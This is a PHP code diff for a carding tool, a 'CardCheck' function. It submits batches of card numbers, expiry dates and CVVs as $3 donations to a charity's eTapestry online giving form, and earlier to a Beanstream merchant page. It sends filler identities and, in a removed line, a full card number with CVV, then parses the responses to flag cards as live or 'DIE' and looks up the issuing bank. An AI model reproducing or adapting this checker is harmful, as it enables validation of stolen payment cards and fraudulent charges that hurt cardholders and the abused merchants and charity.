@@ -172,10 +172,10 @@ function CardCheck($card, $mes, $ano, $cvv) {
 
     $ch = curl_init();
     //$urlPost = "https://www.beanstream.com/scripts/payment/payment.asp?merchant_id=117587301";
-    $urlPost = "https://www.beanstream.com/scripts/process_transaction.as";
+    $urlPost = "https://sna.etapestry.com/prod/HostedOnlineDonorRegSave.jsp";
     
     //$post = "sessionToken=" . getSession() . "&paymentAction=&merchant_id=117587301&preview=&visaCheckoutCallId=&aDFinancingType=&aDPlanNumber=&aDGracePeriod=&aDTerm=&ordName=Mr+Lowan+Drye&ordPhoneNumber=%28216%29+801-4176&ordAddress1=+5784+Cozy+Embers+Walk&ordAddress2=&ordCity=Watertown&ordProvince=OH&ordPostalCode=45315-7116&ordCountry=US&ordEmailAddress=lodr%40freewebmail.com&shipName=&shipEmailAddress=&shipPhoneNumber=&shipAddress1=&shipAddress2=&shipCity=&shipProvince=&shipPostalCode=&shipCountry=&trnOrderNumber=$trnOrderNumber&trnAmount=3.00&paymentMethod=CC&trnCardOwner=Mr+Lowan+Drye&trnCardType=MC&trnCardNumber=$group_card&trnExpMonth=$group_mes&trnExpYear=$group_ano&trnCardCvd=$group_cvv&trnComments=";
-    $post = "payFormParams='payment_type=PaymentForm&merchant_id=117587301&trnType=P&errorPage=%2Fscripts%2Fpayment%2Fpayment%2Easp&approvedPage=&declinedPage=&epe_client_found=false&trnLanguage=eng&shipping_method=&ref1=&ref2=&ref3=&ref4=&ref5=&shippingMethod=&deliveryEstimate=&ordTax1Price=&ordTax2Price=&ordItemPrice=0&ordShippingPrice=0&trnOrderNumber=22157717&trnAmount=3%2E00&ordName=Mr+Lowan+Drye&ordEmailAddress=lodr%40freewebmail%2Ecom&ordPhoneNumber=%28216%29+801%2D4176&ordAddress1=+5784+Cozy+Embers+Walk&ordCity=Watertown&ordProvince=OH&ordPostalCode=45315%2D7116&ordCountry=US&paymentMethod=CC&trnCardOwner=Mr+Lowan+Drye&trnCardCvd=958&cavBirthMonth=&cavBirthDay=&cavBirthYear=&cavSin=&paymentAction=&trnCardNumber=5512%2D3871%2D3216%2D8841%2D&trnExpMonth=09&trnExpYear=19&aDFinancingType=&aDPlanNumber=&aDGracePeriod=&aDTerm='";
+    $post = "dbOrgName=SuitedForChange&locale=en_US&isDiy=true&isNewAddress=true&pageId=zZLHaedi&successURL=https%3A%2F%2Fapp.etapestry.com%2Fonlineforms%2FSuitedForChange%2FOnlineGivingSuccess.html&failURL=https%3A%2F%2Fapp.etapestry.com%2Fonlineforms%2FSuitedForChange%2FOnlineGivingFail.html&persona=Personal&notifyDonor=true&fromEMail=finance%40suitedforchange.org&notifyOrg=true&notifyEMail=finance%40suitedforchange.org&transType=donation&allow=true&accountName=&sortName=&longSalutation=&shortSalutation=&personaNote=&rgsCreate=true&rgsCopyUDFs=true&approachName=904.0.160414791&campaignName=4081.0.1939578&transProcessorRefName=904.0.269439022&letterName=&donorEmailSubject=Thank+you+from+Suited+for+Change&orgEmailSubject=Donation+Confirmation&donorEmailRef=904.0.317499421&orgLocale=en_US&fundName=4081.0.1740887&salutation=Mr.&salutationGender=&firstName=Edwin&middleName=&lastName=Marin&suffix=&country=US&address=+2933+Red+Dale&city=Buckingham+circle&state=VA&selectedState=VA&postalCode=24195-5432&email=edw-marin%40yahoo.ca&confirmEmail=edw-marin%40yahoo.ca&phone=%28757%29+642-7675&JournalEntry_TextField%7C904.0.272507933=&JournalEntry_NewSetElement%7C4081.0.41935901=%28None+Selected%29&JournalEntry_TextField%7C4081.0.41935923=&otherAmt=3&rgsFrequency=-&amount=3.00&cardType=MasterCard&cardholderName=Edwin+Marin&cardNumber=$group_card&cardCVV2=$group_cvv&cardExpMonth=$group_mes&cardExpYear=$group_ano&comments=&eCommercePageName=https%3A%2F%2Fapp.etapestry.com%2Fonlineforms%2FSuitedForChange%2FOnlineGiving.html";
 
     curl_setopt($ch, CURLINFO_HEADER_OUT, 1);
     curl_setopt($ch, CURLOPT_URL, $urlPost);
@@ -191,28 +191,40 @@ function CardCheck($card, $mes, $ano, $cvv) {
     curl_setopt($ch, CURLOPT_COOKIEFILE, '/CardCheck_logs.txt');
     curl_setopt($ch, CURLOPT_VERBOSE, 1);
     curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_REFERER, 'https://www.beanstream.com/scripts/payment/payment.asp?merchant_id=117587301');
+    curl_setopt($ch, CURLOPT_REFERER, 'https://app.etapestry.com/onlineforms/SuitedForChange/OnlineGiving.html');
     curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
     $data = curl_exec($ch);
     $curl_headers = curl_getinfo ($ch , CURLINFO_HEADER_OUT);
+    $data = $curl_headers;
     curl_close($ch);
     
     
-    echo "<pre>";
-    print_r($curl_headers);
-    print_r($data);
-    echo "</pre>";
-    die();
-    
-    echo $data;
+//    echo "<pre>Headers\n";
+//    print_r($curl_headers);
+//    echo "\n\nDATA:\n";
+//    print_r($data);
+//    echo "</pre>";
+//    die();
+//    
+//    echo $data;
 
 
     if ($data) {
-        if (preg_match("Transaction Declined", $data)) {
-            echo "<div class='alert alert-danger' style='width: 80%;'> INFOCC: {$card}|{$mes}|{$ano}|{$cvv}  $   - DIE </div>";
-        } elseif (preg_match("Transaction Declined", $data)) {
-            echo "<div class='alert alert-danger' style='width: 80%;'> INFOCC : {$card}|{$mes}|{$ano}|{$cvv}  $  - DIE Cartao Nao suportado </div>";
-        } elseif (preg_match("THANK YOU!", $data)) {
+        $errorMsg = strstr($data, "errorMsg");
+        $errorCode = strstr($data, "errorCode");
+        
+        if ($errorMsg !== false) {
+            echo "<div class='alert alert-danger' style='width: 80%;'> INFOCC: {$card}|{$mes}|{$ano}|{$cvv}  $   - DIE achou errorMsg: ". substr(urldecode($errorMsg), 9, 56) ."</div>";
+//            die("<pre>$data</pre>");
+        } elseif ($errorCode !== false) {
+            echo "<div class='alert alert-danger' style='width: 80%;'> INFOCC : {$card}|{$mes}|{$ano}|{$cvv}  $  - DIE achou errorCode: ". substr(urldecode($errorCode), 10, 56) ."</div>";
+//            die("<pre>$data</pre>");
+        } else /*if (preg_match("Transaction Successful", $data)) */{
+            
+            echo preg_match("errorCode", $data);
+            echo preg_match("errorMsg", $data);
+            echo "<div class='alert alert-success' style='width: 80%;'> Check : {$card}|{$mes}|{$ano}|{$cvv}: $info: - Resposta : não achou nem errorCode e nem errorMsg </div>";
+            die($data);
 
             $cc = substr($card, 0, 6);
             $ch = curl_init();
@@ -248,9 +260,12 @@ function CardCheck($card, $mes, $ano, $cvv) {
             $infos = $banco . '|' . $cartao12311 . '|' . $cartaor . '|' . $cartao123 . '|' . $cartao1231;
 
 
-            echo "<div class='alert alert-success' style='width: 80%;'> Check : {$card}|{$mes}|{$ano}|{$cvv}: $info: - Resposta : Autorizado pelo banco emissor </div>";
-        } else {
-            echo "<div class='alert alert-danger' style='width: 80%;'> Check : {$card}|{$mes}|{$ano}|{$cvv}:  - Resposta : Codigo errado anta. </div>";
+            echo "<div class='alert alert-success' style='width: 80%;'> Check : {$card}|{$mes}|{$ano}|{$cvv}: $info: - Resposta : não achou nem errorCode e nem errorMsg </div>";
+            echo ($data);
+//        } else {
+//            //echo "<code>$data</code>";
+//            //die('preg_match success');
+//            echo "<div class='alert alert-danger' style='width: 80%;'> Check : {$card}|{$mes}|{$ano}|{$cvv}:  - Resposta : Codigo errado anta. </div>";
         }
     }
 }
